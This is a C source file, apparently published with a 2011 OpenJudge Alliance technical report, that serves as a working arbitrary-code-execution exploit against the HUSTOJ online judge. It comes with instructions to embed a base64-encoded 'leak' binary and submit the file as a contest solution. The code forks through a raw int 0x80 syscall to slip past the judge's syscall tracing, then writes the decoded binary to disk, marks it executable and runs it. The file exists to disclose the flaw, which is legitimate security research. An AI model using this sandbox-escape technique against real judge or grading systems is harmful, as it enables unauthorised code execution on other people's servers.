/**
 * @copyright (c) 2011, OpenJudge Alliance <http://openjudge.net>
 * @author LIU Yu <pineapple.liu@gmail.com>
 * @date 2011/12/13
 * 
 * This program source code is part of the OpenJudge Alliance Technical Report 
 * (TR-OJA-201112A) at <http://openjudge.net/Report/201112A>.
 *
 * DESCRIPTION:
 * 
 * This is the arbitrary code execution exploit (i.e. Exploit 2) of the open-
 * source online judge system HUSTOJ <http://code.google.com/p/hustoj/> as 
 * discussed in the above-mentioned technical report TR-OJA-201112A.
 * 
 * To verify the security risks,
 * 
 * 1. prepare a leak program that performs something normally restricted, i.e.
 *    opening an HTTP connection to some URL on the Internet, send an email to 
 *    some address, or whatever that can verify it being executed;
 * 2. encode the binary leak program with "base64 -w0" command line utility, and
 *    place the entire base64-encoded content of the leak program to the value 
 *    of variable "code" in function child() of this program;
 * 3. submit this program to a HUSTOJ host as a C++ solution to problem 1000;
 *
 * ACKNOWLEDGEMENT
 *
 * Some techniques used in this exploit comes from, 
 * 
 *   Chris Evans, Linux syscall interception technologies partial bypass.
 *   http://scary.beasts.org/security/CESA-2009-001.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

void decode(const char *, FILE *);

int child()
{
    static const char * code = "<encoded content of leak program>";
    static const char * code_cmd = "./leak";
    FILE * fp = fopen("./leak", "wb");
    decode(code, fp);
    fclose(fp);
    chmod(code_cmd, 0775);
    return execl(code_cmd, code_cmd, "0", (char *)NULL);   
}

int traced()
{
    /* int i, a, b;
    while (scanf("%d %d", &a, &b) == 2)
    {
        printf("%d\n", a + b);
    } */
    int i;
    for (i = 0; i < 30000000; i++);
    return 0;
}

int main(void)
{    
    int pid;
    asm volatile("movl $2, %%eax\n"
                 "int $0x80\n"
                 "movl %%eax, %0\n": "=r"(pid));
    if (pid == 0)
    {
        return child();
    }
    return traced();
}

/* base64 decoding from http://base64.sourceforge.net/b64.c */

static const char cd64[] = "|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";

void decodeblock( unsigned char in[4], unsigned char out[3] )
{   
    out[ 0 ] = (unsigned char ) (in[0] << 2 | in[1] >> 4);
    out[ 1 ] = (unsigned char ) (in[1] << 4 | in[2] >> 2);
    out[ 2 ] = (unsigned char ) (((in[2] << 6) & 0xc0) | in[3]);
}

void decode(const char * code, FILE * fout)
{
    unsigned char in[4], out[3], v;
    int i, len;
    int cur = 0, N = strlen(code) + 1;
    while (cur < N)
    {
        for (len = 0, i = 0; i < 4 && cur < N; i++)
        {
            v = 0;
            while (cur < N && v == 0)
            {
                v = (unsigned char) code[cur++];
                v = (unsigned char) ((v < 43 || v > 122) ? 0 : cd64[ v - 43 ]);
                if (v)
                    v = (unsigned char) ((v == '$') ? 0 : v - 61);
            }
            if (cur < N)
            {
                len++;
                if (v) 
                    in[ i ] = (unsigned char) (v - 1);
            }
            else in[i] = 0;
        }
        if (len)
        {
            decodeblock(in, out);
            for (i = 0; i < len - 1; i++)
                fputc(out[i], fout);
        }
    }
}
